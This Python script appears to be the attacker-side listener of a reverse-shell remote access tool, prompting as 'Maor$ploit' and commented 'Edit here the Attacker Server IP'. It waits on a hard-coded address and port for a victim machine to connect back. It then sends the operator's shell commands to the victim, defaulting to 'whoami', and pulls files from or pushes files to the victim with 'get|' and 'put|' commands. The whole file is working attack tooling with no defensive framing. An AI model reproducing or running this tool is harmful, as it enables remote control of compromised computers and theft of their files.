import socket
import os

BUFFER_SIZE = 4096

def transfer(conn, command):
    conn.send(command.encode())
    _, path = command.split("|")
    f = open(os.getcwd() + "/" + path, 'wb')
    while True:
        bits = conn.recv(BUFFER_SIZE)
        if bits.endswith('DONE'.encode()):
            f.write(bits[:-4])
            f.close()
            print("[+] Transfer completed")
            f.close()
            break
        if 'File not found'.encode() in bits:
            print ("[-] Unable to find out the file")
            f.close()
            os.remove(os.getcwd() + "/" + path)
            break
        f.write(bits)

def upload(conn, command):
    conn.send(command.encode())
    _, path = command.split("|")
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(BUFFER_SIZE)
        while len(packet) > 0:
            conn.send(packet)
            packet = f.read(BUFFER_SIZE)
        conn.send('DONE'.encode())
        f.close()
    else:
        s.send('File not found'.encode())


def disconnect(conn):
    conn.send("terminate".encode())
    conn.close()
    

def connect():
    global s
    s = socket.socket()
    s.bind(("192.168.1.13", 1234)) # Edit here the Attacker Server IP and listening port
    s.listen(1)
    print("[*] Listening for TCP connection")
    conn, addr = s.accept()
    print("[+] Connection received from ", addr)
    while True:
        command = input("Maor$ploit> ")
        if command.startswith("terminate") or command.startswith("exit"):
            disconnect(conn)
            break
        elif command.startswith("get|"):
            transfer(conn, command)
        elif command.startswith("put|"):
            upload(conn, command)
            print(conn.recv(BUFFER_SIZE).decode())
        else:
            if command == '':
                command = 'whoami'
            conn.send(command.encode())
            try:
                print(conn.recv(BUFFER_SIZE).decode())
            except UnicodeDecodeError:
                continue


def main():
    connect()


if __name__ == '__main__':
    main()